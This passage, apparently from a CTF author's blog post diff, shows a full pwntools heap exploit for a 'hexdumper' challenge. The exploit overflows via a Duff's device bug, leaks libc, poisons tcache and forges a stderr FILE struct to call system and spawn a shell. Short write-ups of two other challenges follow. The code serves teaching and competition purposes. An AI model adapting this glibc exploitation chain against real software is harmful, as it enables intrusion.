+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code>    <span class="c1"># Poison tcache pointer to point to the stderr FILE struct.
+</span>    <span class="n">change_bytes</span><span class="p">(</span><span class="n">io</span><span class="p">,</span> <span class="n">c</span><span class="p">,</span> <span class="mh">0x20</span><span class="p">,</span> <span class="n">p64</span><span class="p">(((</span><span class="n">libc</span><span class="p">.</span><span class="n">sym</span><span class="p">[</span><span class="s">'_IO_2_1_stderr_'</span><span class="p">])</span> <span class="o">^</span> <span class="p">(</span><span class="n">xor_key</span><span class="p">))))</span>
+    <span class="n">x</span> <span class="o">=</span> <span class="n">create_dump</span><span class="p">(</span><span class="n">io</span><span class="p">,</span> <span class="mh">0xf0</span><span class="o">-</span><span class="mi">8</span><span class="p">)</span>
+    <span class="c1"># Malloc returned a pointer inside of libc, with which we will do FSOP.
+</span>    <span class="n">target</span> <span class="o">=</span> <span class="n">create_dump</span><span class="p">(</span><span class="n">io</span><span class="p">,</span> <span class="mh">0xf0</span><span class="o">-</span><span class="mi">8</span><span class="p">)</span>
+
+    <span class="c1"># Payload I have stolen from ptr-yudai.
+</span>    <span class="nb">file</span> <span class="o">=</span> <span class="n">FileStructure</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
+    <span class="nb">file</span><span class="p">.</span><span class="n">flags</span> <span class="o">=</span> <span class="n">u64</span><span class="p">(</span><span class="n">p32</span><span class="p">(</span><span class="mh">0xfbad0101</span><span class="p">)</span> <span class="o">+</span> <span class="sa">b</span><span class="s">";sh</span><span class="se">\0</span><span class="s">"</span><span class="p">)</span>
+    <span class="nb">file</span><span class="p">.</span><span class="n">_IO_save_end</span> <span class="o">=</span> <span class="n">libc</span><span class="p">.</span><span class="n">sym</span><span class="p">[</span><span class="s">"system"</span><span class="p">]</span>
+    <span class="nb">file</span><span class="p">.</span><span class="n">_lock</span> <span class="o">=</span> <span class="n">libc</span><span class="p">.</span><span class="n">sym</span><span class="p">[</span><span class="s">"_IO_2_1_stderr_"</span><span class="p">]</span> <span class="o">-</span> <span class="mh">0x10</span>
+    <span class="nb">file</span><span class="p">.</span><span class="n">_wide_data</span> <span class="o">=</span> <span class="n">libc</span><span class="p">.</span><span class="n">sym</span><span class="p">[</span><span class="s">"_IO_2_1_stderr_"</span><span class="p">]</span> <span class="o">-</span> <span class="mh">0x10</span>
+    <span class="nb">file</span><span class="p">.</span><span class="n">_offset</span> <span class="o">=</span> <span class="mi">0</span>
+    <span class="nb">file</span><span class="p">.</span><span class="n">_old_offset</span> <span class="o">=</span> <span class="mi">0</span>
+    <span class="nb">file</span><span class="p">.</span><span class="n">unknown2</span> <span class="o">=</span> <span class="sa">b</span><span class="s">"</span><span class="se">\x00</span><span class="s">"</span><span class="o">*</span><span class="mi">24</span><span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">+</span> \
+        <span class="n">p64</span><span class="p">(</span><span class="n">libc</span><span class="p">.</span><span class="n">sym</span><span class="p">[</span><span class="s">"_IO_2_1_stderr_"</span><span class="p">]</span> <span class="o">-</span> <span class="mh">0x10</span><span class="p">)</span> <span class="o">+</span> \
+        <span class="n">p64</span><span class="p">(</span><span class="n">libc</span><span class="p">.</span><span class="n">sym</span><span class="p">[</span><span class="s">"_IO_wfile_jumps"</span><span class="p">]</span> <span class="o">+</span> <span class="mh">0x18</span> <span class="o">-</span> <span class="mh">0x58</span><span class="p">)</span>
+    <span class="n">change_bytes</span><span class="p">(</span><span class="n">io</span><span class="p">,</span> <span class="n">target</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="nb">bytes</span><span class="p">(</span><span class="nb">file</span><span class="p">))</span>
+
+    <span class="n">io</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="sa">b</span><span class="s">"cat flag"</span><span class="p">)</span>
+    <span class="n">io</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="sa">b</span><span class="s">"cat flag"</span><span class="p">)</span>
+
+    <span class="n">io</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s">"BtSCTF"</span><span class="p">)</span>
+    <span class="n">io</span><span class="p">.</span><span class="n">intearactive</span><span class="p">()</span>
+</code></pre></div></div>
+
+<p>This is how the full exploit looks like:</p>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">#!/usr/bin/env python3
+</span>
+<span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+
+<span class="n">exe</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s">"./hexdumper_patched"</span><span class="p">)</span>
+<span class="n">libc</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s">"./libc.so.6"</span><span class="p">)</span>
+<span class="n">ld</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s">"./ld-linux-x86-64.so.2"</span><span class="p">)</span>
+
+<span class="n">context</span><span class="p">.</span><span class="n">binary</span> <span class="o">=</span> <span class="n">exe</span>
+<span class="n">context</span><span class="p">.</span><span class="n">terminal</span> <span class="o">=</span> <span class="s">"alacritty -e"</span><span class="p">.</span><span class="n">split</span><span class="p">()</span>
+
+
+<span class="k">def</span> <span class="nf">conn</span><span class="p">():</span>
+    <span class="k">if</span> <span class="n">args</span><span class="p">.</span><span class="n">LOCAL</span><span class="p">:</span>
+        <span class="k">if</span> <span class="n">args</span><span class="p">.</span><span class="n">GDB</span><span class="p">:</span>
+            <span class="n">io</span> <span class="o">=</span> <span class="n">gdb</span><span class="p">.</span><span class="n">debug</span><span class="p">([</span><span class="n">exe</span><span class="p">.</span><span class="n">path</span><span class="p">],</span> <span class="n">aslr</span><span class="o">=</span><span class="bp">False</span><span class="p">,</span> <span class="n">api</span><span class="o">=</span><span class="bp">False</span><span class="p">,</span> <span class="n">gdbscript</span><span class="o">=</span><span class="s">"""
+            set follow-fork-mode parent
+            """</span><span class="p">)</span>
+        <span class="k">else</span><span class="p">:</span>
+            <span class="n">io</span> <span class="o">=</span> <span class="n">process</span><span class="p">([</span><span class="n">exe</span><span class="p">.</span><span class="n">path</span><span class="p">])</span>
+            <span class="c1">#gdb.attach(io)
+</span>    <span class="k">else</span><span class="p">:</span>
+        <span class="n">io</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s">"127.0.0.1"</span><span class="p">,</span> <span class="mi">1337</span><span class="p">)</span>
+    <span class="k">return</span> <span class="n">io</span>
+
+
+<span class="k">def</span> <span class="nf">create_dump</span><span class="p">(</span><span class="n">io</span><span class="p">,</span> <span class="n">size</span><span class="p">):</span>
+    <span class="n">io</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s">"==&gt;"</span><span class="p">,</span> <span class="sa">b</span><span class="s">"1"</span><span class="p">)</span>
+    <span class="n">io</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s">"size"</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">size</span><span class="p">).</span><span class="n">encode</span><span class="p">())</span>
+    <span class="n">io</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s">"at index "</span><span class="p">)</span>
+    <span class="k">return</span> <span class="nb">int</span><span class="p">(</span><span class="n">io</span><span class="p">.</span><span class="n">recvline</span><span class="p">())</span>
+
+
+<span class="k">def</span> <span class="nf">hexdump_dump</span><span class="p">(</span><span class="n">io</span><span class="p">,</span> <span class="n">idx</span><span class="p">):</span>
+    <span class="n">io</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s">"==&gt;"</span><span class="p">,</span> <span class="sa">b</span><span class="s">"2"</span><span class="p">)</span>
+    <span class="n">io</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s">"index: "</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">idx</span><span class="p">).</span><span class="n">encode</span><span class="p">())</span>
+    <span class="n">io</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s">"+"</span><span class="p">)</span>
+    <span class="n">io</span><span class="p">.</span><span class="n">recvline</span><span class="p">()</span>
+    <span class="n">dump</span> <span class="o">=</span> <span class="p">[]</span>
+    <span class="k">while</span> <span class="p">(</span><span class="n">line</span> <span class="p">:</span><span class="o">=</span> <span class="n">io</span><span class="p">.</span><span class="n">recvline</span><span class="p">().</span><span class="n">strip</span><span class="p">())</span> <span class="o">!=</span> <span class="sa">b</span><span class="s">""</span><span class="p">:</span>
+        <span class="n">line</span> <span class="o">=</span> <span class="n">line</span><span class="p">.</span><span class="n">split</span><span class="p">(</span><span class="sa">b</span><span class="s">"|"</span><span class="p">)[</span><span class="mi">1</span><span class="p">]</span>
+        <span class="n">dump</span><span class="p">.</span><span class="n">extend</span><span class="p">([</span><span class="nb">int</span><span class="p">(</span><span class="n">n</span><span class="p">,</span> <span class="mi">16</span><span class="p">)</span> <span class="k">for</span> <span class="n">n</span> <span class="ow">in</span> <span class="n">line</span><span class="p">.</span><span class="n">split</span><span class="p">()])</span>
+    <span class="k">return</span> <span class="nb">bytes</span><span class="p">(</span><span class="n">dump</span><span class="p">)</span>
+
+
+<span class="k">def</span> <span class="nf">change_byte</span><span class="p">(</span><span class="n">io</span><span class="p">,</span> <span class="n">idx</span><span class="p">,</span> <span class="n">offset</span><span class="p">,</span> <span class="n">val</span><span class="p">):</span>
+    <span class="n">io</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s">"==&gt;"</span><span class="p">,</span> <span class="sa">b</span><span class="s">"3"</span><span class="p">)</span>
+    <span class="n">io</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s">"index: "</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">idx</span><span class="p">).</span><span class="n">encode</span><span class="p">())</span>
+    <span class="n">io</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s">"Offset: "</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">offset</span><span class="p">).</span><span class="n">encode</span><span class="p">())</span>
+    <span class="n">io</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s">"decimal: "</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">val</span><span class="p">).</span><span class="n">encode</span><span class="p">())</span>
+
+
+<span class="k">def</span> <span class="nf">change_bytes</span><span class="p">(</span><span class="n">io</span><span class="p">,</span> <span class="n">idx</span><span class="p">,</span> <span class="n">offset</span><span class="p">,</span> <span class="n">ba</span><span class="p">):</span>
+    <span class="k">for</span> <span class="n">i</span><span class="p">,</span> <span class="n">byte</span> <span class="ow">in</span> <span class="nb">enumerate</span><span class="p">(</span><span class="n">ba</span><span class="p">):</span>
+        <span class="n">change_byte</span><span class="p">(</span><span class="n">io</span><span class="p">,</span> <span class="n">idx</span><span class="p">,</span> <span class="n">offset</span><span class="o">+</span><span class="n">i</span><span class="p">,</span> <span class="n">byte</span><span class="p">)</span>
+
+
+<span class="k">def</span> <span class="nf">merge</span><span class="p">(</span><span class="n">io</span><span class="p">,</span> <span class="n">idx1</span><span class="p">,</span> <span class="n">idx2</span><span class="p">):</span>
+    <span class="n">io</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s">"==&gt;"</span><span class="p">,</span> <span class="sa">b</span><span class="s">"4"</span><span class="p">)</span>
+    <span class="n">io</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s">"index: "</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">idx1</span><span class="p">).</span><span class="n">encode</span><span class="p">())</span>
+    <span class="n">io</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s">"index: "</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">idx2</span><span class="p">).</span><span class="n">encode</span><span class="p">())</span>
+
+
+<span class="k">def</span> <span class="nf">resize_dump</span><span class="p">(</span><span class="n">io</span><span class="p">,</span> <span class="n">idx</span><span class="p">,</span> <span class="n">new_size</span><span class="p">):</span>
+    <span class="n">io</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s">"==&gt;"</span><span class="p">,</span> <span class="sa">b</span><span class="s">"5"</span><span class="p">)</span>
+    <span class="n">io</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s">"index: "</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">idx</span><span class="p">).</span><span class="n">encode</span><span class="p">())</span>
+    <span class="n">io</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s">"New size: "</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">new_size</span><span class="p">).</span><span class="n">encode</span><span class="p">())</span>
+
+
+<span class="k">def</span> <span class="nf">remove_dump</span><span class="p">(</span><span class="n">io</span><span class="p">,</span> <span class="n">idx</span><span class="p">):</span>
+    <span class="n">io</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s">"==&gt;"</span><span class="p">,</span> <span class="sa">b</span><span class="s">"6"</span><span class="p">)</span>
+    <span class="n">io</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s">"index: "</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">idx</span><span class="p">).</span><span class="n">encode</span><span class="p">())</span>
+
+
+<span class="k">def</span> <span class="nf">list_dumps</span><span class="p">(</span><span class="n">io</span><span class="p">):</span>
+    <span class="n">io</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s">"==&gt;"</span><span class="p">,</span> <span class="sa">b</span><span class="s">"7"</span><span class="p">)</span>
+    <span class="n">dumps</span> <span class="o">=</span> <span class="p">[]</span>
+    <span class="k">while</span> <span class="p">(</span><span class="n">line</span> <span class="p">:</span><span class="o">=</span> <span class="n">io</span><span class="p">.</span><span class="n">recvline</span><span class="p">())</span> <span class="o">!=</span> <span class="sa">b</span><span class="s">""</span><span class="p">:</span>
+        <span class="n">idx</span><span class="p">,</span> <span class="nb">len</span> <span class="o">=</span> <span class="n">line</span><span class="p">.</span><span class="n">split</span><span class="p">(</span><span class="sa">b</span><span class="s">": "</span><span class="p">)</span>
+        <span class="n">idx</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">idx</span><span class="p">)</span>
+        <span class="nb">len</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="nb">len</span><span class="p">.</span><span class="n">split</span><span class="p">(</span><span class="sa">b</span><span class="s">"="</span><span class="p">)[</span><span class="mi">1</span><span class="p">])</span>
+        <span class="n">dumps</span><span class="p">.</span><span class="n">append</span><span class="p">((</span><span class="n">idx</span><span class="p">,</span> <span class="nb">len</span><span class="p">))</span>
+    <span class="k">return</span> <span class="n">dumps</span>
+    
+
+<span class="k">def</span> <span class="nf">coredump</span><span class="p">(</span><span class="n">io</span><span class="p">):</span>
+    <span class="n">io</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s">"==&gt;"</span><span class="p">,</span> <span class="sa">b</span><span class="s">"0"</span><span class="p">)</span>
+
+
+<span class="k">def</span> <span class="nf">main</span><span class="p">():</span>
+    <span class="n">io</span> <span class="o">=</span> <span class="n">conn</span><span class="p">()</span>
+
+    <span class="c1"># Allocate 3 dumps.
+</span>    <span class="n">a</span> <span class="o">=</span> <span class="n">create_dump</span><span class="p">(</span><span class="n">io</span><span class="p">,</span> <span class="mi">16</span><span class="p">)</span>
+    <span class="n">b</span> <span class="o">=</span> <span class="n">create_dump</span><span class="p">(</span><span class="n">io</span><span class="p">,</span> <span class="mi">24</span><span class="p">)</span>
+    <span class="n">c</span> <span class="o">=</span> <span class="n">create_dump</span><span class="p">(</span><span class="n">io</span><span class="p">,</span> <span class="mi">16</span><span class="p">)</span>
+
+    <span class="c1"># We write p64(0x411) at the first 8 bytes of dump a.
+</span>    <span class="c1"># Those are the bytes that will be appended in the overflow
+</span>    <span class="c1"># to dump b during the merge.
+</span>    <span class="n">change_bytes</span><span class="p">(</span><span class="n">io</span><span class="p">,</span> <span class="n">a</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x411</span><span class="p">))</span>
+    <span class="c1"># Resize dump a to zero to exploit the bug in Duff's device.
+</span>    <span class="n">resize_dump</span><span class="p">(</span><span class="n">io</span><span class="p">,</span> <span class="n">a</span><span class="p">,</span> <span class="mi">0</span><span class="p">)</span>
+    <span class="c1"># Do the merge, in effect we overwrite the heap's metadata.
+</span>    <span class="c1"># Specifically we overwrite dump c's chunk size to 0x410.
+</span>    <span class="n">merge</span><span class="p">(</span><span class="n">io</span><span class="p">,</span> <span class="n">b</span><span class="p">,</span> <span class="n">a</span><span class="p">)</span>
+
+    <span class="c1"># Free the chunk and allocate it again to get overlapping chunks.
+</span>    <span class="n">remove_dump</span><span class="p">(</span><span class="n">io</span><span class="p">,</span> <span class="n">c</span><span class="p">)</span>
+    <span class="n">c</span> <span class="o">=</span> <span class="n">create_dump</span><span class="p">(</span><span class="n">io</span><span class="p">,</span> <span class="mh">0x400</span><span class="p">)</span>
+    <span class="c1"># Fix the top chunk size that got zeroed-out by the allocation.
+</span>    <span class="n">change_bytes</span><span class="p">(</span><span class="n">io</span><span class="p">,</span> <span class="n">c</span><span class="p">,</span> <span class="mi">16</span><span class="o">+</span><span class="mi">8</span><span class="p">,</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x0000000000020d11</span><span class="p">))</span>
+
+    
+    <span class="n">leaky_dump</span> <span class="o">=</span> <span class="n">create_dump</span><span class="p">(</span><span class="n">io</span><span class="p">,</span> <span class="mh">0x1000</span><span class="p">)</span>
+    <span class="c1"># Create a chunk so after freeing the one above it wont get merged
+</span>    <span class="c1"># with the top chunk.
+</span>    <span class="n">guard_dump</span> <span class="o">=</span> <span class="n">create_dump</span><span class="p">(</span><span class="n">io</span><span class="p">,</span> <span class="mi">32</span><span class="p">)</span>
+    <span class="n">remove_dump</span><span class="p">(</span><span class="n">io</span><span class="p">,</span> <span class="n">leaky_dump</span><span class="p">)</span>
+    <span class="n">hx</span> <span class="o">=</span> <span class="n">hexdump_dump</span><span class="p">(</span><span class="n">io</span><span class="p">,</span> <span class="n">c</span><span class="p">)</span>
+    <span class="n">libc_leak</span> <span class="o">=</span> <span class="n">u64</span><span class="p">(</span><span class="n">hx</span><span class="p">[</span><span class="mi">32</span><span class="p">:</span><span class="mi">32</span><span class="o">+</span><span class="mi">8</span><span class="p">])</span>
+    <span class="n">info</span><span class="p">(</span><span class="sa">f</span><span class="s">"</span><span class="si">{</span><span class="nb">hex</span><span class="p">(</span><span class="n">libc_leak</span><span class="p">)</span><span class="o">=</span><span class="si">}</span><span class="s">"</span><span class="p">)</span>
+    <span class="n">libc</span><span class="p">.</span><span class="n">address</span> <span class="o">=</span> <span class="n">libc_leak</span> <span class="o">-</span> <span class="mh">0x211b20</span>
+    <span class="n">info</span><span class="p">(</span><span class="sa">f</span><span class="s">"</span><span class="si">{</span><span class="nb">hex</span><span class="p">(</span><span class="n">libc</span><span class="p">.</span><span class="n">address</span><span class="p">)</span><span class="o">=</span><span class="si">}</span><span class="s">"</span><span class="p">)</span>
+
+    <span class="c1"># Create small chunks for tcache poisoning.
+</span>    <span class="n">d</span> <span class="o">=</span> <span class="n">create_dump</span><span class="p">(</span><span class="n">io</span><span class="p">,</span> <span class="mh">0xf0</span><span class="o">-</span><span class="mi">8</span><span class="p">)</span>
+    <span class="n">e</span> <span class="o">=</span> <span class="n">create_dump</span><span class="p">(</span><span class="n">io</span><span class="p">,</span> <span class="mh">0xf0</span><span class="o">-</span><span class="mi">8</span><span class="p">)</span>
+    <span class="n">f</span> <span class="o">=</span> <span class="n">create_dump</span><span class="p">(</span><span class="n">io</span><span class="p">,</span> <span class="mh">0xf0</span><span class="o">-</span><span class="mi">8</span><span class="p">)</span>
+    <span class="n">g</span> <span class="o">=</span> <span class="n">create_dump</span><span class="p">(</span><span class="n">io</span><span class="p">,</span> <span class="mh">0xf0</span><span class="o">-</span><span class="mi">8</span><span class="p">)</span>
+    
+    <span class="n">remove_dump</span><span class="p">(</span><span class="n">io</span><span class="p">,</span> <span class="n">g</span><span class="p">)</span>
+    <span class="n">hx</span> <span class="o">=</span> <span class="n">hexdump_dump</span><span class="p">(</span><span class="n">io</span><span class="p">,</span> <span class="n">c</span><span class="p">)</span>
+    <span class="c1"># Leak xor key to decrypt safe linking.
+</span>    <span class="n">xor_key</span> <span class="o">=</span> <span class="n">u64</span><span class="p">(</span><span class="n">hx</span><span class="p">[</span><span class="mh">0x2f0</span><span class="p">:</span><span class="mh">0x2f0</span><span class="o">+</span><span class="mi">8</span><span class="p">])</span>
+    <span class="n">info</span><span class="p">(</span><span class="sa">f</span><span class="s">"</span><span class="si">{</span><span class="nb">hex</span><span class="p">(</span><span class="n">xor_key</span><span class="p">)</span><span class="o">=</span><span class="si">}</span><span class="s">"</span><span class="p">)</span>
+    <span class="c1"># Prepare chunks for tcache poisoning.
+</span>    <span class="n">remove_dump</span><span class="p">(</span><span class="n">io</span><span class="p">,</span> <span class="n">f</span><span class="p">)</span>
+    <span class="n">remove_dump</span><span class="p">(</span><span class="n">io</span><span class="p">,</span> <span class="n">e</span><span class="p">)</span>
+    <span class="n">remove_dump</span><span class="p">(</span><span class="n">io</span><span class="p">,</span> <span class="n">d</span><span class="p">)</span>
+
+    <span class="c1"># Poison tcache pointer to point to the stderr FILE struct.
+</span>    <span class="n">change_bytes</span><span class="p">(</span><span class="n">io</span><span class="p">,</span> <span class="n">c</span><span class="p">,</span> <span class="mh">0x20</span><span class="p">,</span> <span class="n">p64</span><span class="p">(((</span><span class="n">libc</span><span class="p">.</span><span class="n">sym</span><span class="p">[</span><span class="s">'_IO_2_1_stderr_'</span><span class="p">])</span> <span class="o">^</span> <span class="p">(</span><span class="n">xor_key</span><span class="p">))))</span>
+    <span class="n">x</span> <span class="o">=</span> <span class="n">create_dump</span><span class="p">(</span><span class="n">io</span><span class="p">,</span> <span class="mh">0xf0</span><span class="o">-</span><span class="mi">8</span><span class="p">)</span>
+    <span class="c1"># Malloc returned a pointer inside of libc, with which we will do FSOP.
+</span>    <span class="n">target</span> <span class="o">=</span> <span class="n">create_dump</span><span class="p">(</span><span class="n">io</span><span class="p">,</span> <span class="mh">0xf0</span><span class="o">-</span><span class="mi">8</span><span class="p">)</span>
+
+    <span class="c1"># Payload I have stolen from ptr-yudai.
+</span>    <span class="nb">file</span> <span class="o">=</span> <span class="n">FileStructure</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
+    <span class="nb">file</span><span class="p">.</span><span class="n">flags</span> <span class="o">=</span> <span class="n">u64</span><span class="p">(</span><span class="n">p32</span><span class="p">(</span><span class="mh">0xfbad0101</span><span class="p">)</span> <span class="o">+</span> <span class="sa">b</span><span class="s">";sh</span><span class="se">\0</span><span class="s">"</span><span class="p">)</span>
+    <span class="nb">file</span><span class="p">.</span><span class="n">_IO_save_end</span> <span class="o">=</span> <span class="n">libc</span><span class="p">.</span><span class="n">sym</span><span class="p">[</span><span class="s">"system"</span><span class="p">]</span>
+    <span class="nb">file</span><span class="p">.</span><span class="n">_lock</span> <span class="o">=</span> <span class="n">libc</span><span class="p">.</span><span class="n">sym</span><span class="p">[</span><span class="s">"_IO_2_1_stderr_"</span><span class="p">]</span> <span class="o">-</span> <span class="mh">0x10</span>
+    <span class="nb">file</span><span class="p">.</span><span class="n">_wide_data</span> <span class="o">=</span> <span class="n">libc</span><span class="p">.</span><span class="n">sym</span><span class="p">[</span><span class="s">"_IO_2_1_stderr_"</span><span class="p">]</span> <span class="o">-</span> <span class="mh">0x10</span>
+    <span class="nb">file</span><span class="p">.</span><span class="n">_offset</span> <span class="o">=</span> <span class="mi">0</span>
+    <span class="nb">file</span><span class="p">.</span><span class="n">_old_offset</span> <span class="o">=</span> <span class="mi">0</span>
+    <span class="nb">file</span><span class="p">.</span><span class="n">unknown2</span> <span class="o">=</span> <span class="sa">b</span><span class="s">"</span><span class="se">\x00</span><span class="s">"</span><span class="o">*</span><span class="mi">24</span><span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">+</span> \
+        <span class="n">p64</span><span class="p">(</span><span class="n">libc</span><span class="p">.</span><span class="n">sym</span><span class="p">[</span><span class="s">"_IO_2_1_stderr_"</span><span class="p">]</span> <span class="o">-</span> <span class="mh">0x10</span><span class="p">)</span> <span class="o">+</span> \
+        <span class="n">p64</span><span class="p">(</span><span class="n">libc</span><span class="p">.</span><span class="n">sym</span><span class="p">[</span><span class="s">"_IO_wfile_jumps"</span><span class="p">]</span> <span class="o">+</span> <span class="mh">0x18</span> <span class="o">-</span> <span class="mh">0x58</span><span class="p">)</span>
+    <span class="n">change_bytes</span><span class="p">(</span><span class="n">io</span><span class="p">,</span> <span class="n">target</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="nb">bytes</span><span class="p">(</span><span class="nb">file</span><span class="p">))</span>
+
+    <span class="n">io</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="sa">b</span><span class="s">"cat flag"</span><span class="p">)</span>
+    <span class="n">io</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="sa">b</span><span class="s">"cat flag"</span><span class="p">)</span>
+
+    <span class="n">io</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s">"BtSCTF"</span><span class="p">)</span>
+    <span class="n">io</span><span class="p">.</span><span class="n">interactive</span><span class="p">()</span>
+
+
+<span class="k">if</span> <span class="n">__name__</span> <span class="o">==</span> <span class="s">"__main__"</span><span class="p">:</span>
+    <span class="n">main</span><span class="p">()</span>
+</code></pre></div></div>
+
+<h2 id="other-challenges-i-made">Other challenges I made</h2>
+
+<p>I also made two other challanges, Rainbom Bash Adventure and stupid fd manager. but they were pretty simple compared to the previous ones,
+so I won’t dedicate them a separate chapter.</p>
+
+<p>For Rainbom Bash Adventure, the challenge is a renpy visual novel. You
+can find the code of the game in ./game/script.rpy. There what you
+have to do is to parse all the choices as a weighted graph and solve
+the TSP problem using heuristics. You can tell it’s a TSP problem by
+the dialogue: “Help Rainbom Bash smash all the clouds in the fastest
+possible way and return to the origin. I heard it’s a well known
+problem….”. Actually, because of how I generated the graph, you could
+just do a nearest neighbour algorithm instead of a heuristic and I was
+of that but I left it as an unintended-intended since it made the generating
+of the graph easier :P.</p>
+
+<p>For stupid fd manager, the solve was to abuse two facts:</p>
+<ul>
+  <li>stdio in libc is buffered.</li>
+  <li>Opening a file opens the file in the lowest possible file descriptor.</li>
+</ul>
+
+<p>So The solve was to in one line to write “3 0 2 ./flag”.
+The program buffers the whole line -&gt; it closes file descriptor 0, which is standard input -&gt;
+it opens ./flag as file descriptor 0 -&gt; scanf() and family now will do io operations
+on the flag instead of standard input, which shows us the flag.</p>
+
+
+  </div><a class="u-url" href="/ctf/pwn/c/rust/risc-v/2025/05/11/Challenges-I-Wrote-For-BtS-CTF-2025.html" hidden></a>
+</article>
+
+      </div>
+    </main><footer class="site-footer h-card">
+  <data class="u-url" href="/"></data>
+
+  <div class="wrapper">
+
+    <h2 class="footer-heading">poni&#39;s blog</h2>
+
+    <div class="footer-col-wrapper">
+      <div class="footer-col footer-col-1">
+        <ul class="contact-list">
+          <li class="p-name">poni&#39;s blog</li><li><a class="u-email" href="mailto:poniponiponiponiponiponiponiponiponiponi@protonmail.com">poniponiponiponiponiponiponiponiponiponi@protonmail.com</a></li></ul>
+      </div>
+
+      <div class="footer-col footer-col-2"><ul class="social-media-list"><li><a href="https://github.com/poniponiponiponiponiponiponiponiponi"><svg class="svg-icon"><use xlink:href="/assets/minima-social-icons.svg#github"></use></svg> <span class="username">poniponiponiponiponiponiponiponiponi</span></a></li></ul>
+</div>
+
+      <div class="footer-col footer-col-3">
+        <p>My tech blog where I write about things I find interesting. Mostly low level programming, linux and ctf competitions.</p>
+      </div>
+    </div>
+
+  </div>
+
+</footer>
+</body>
+
+</html>
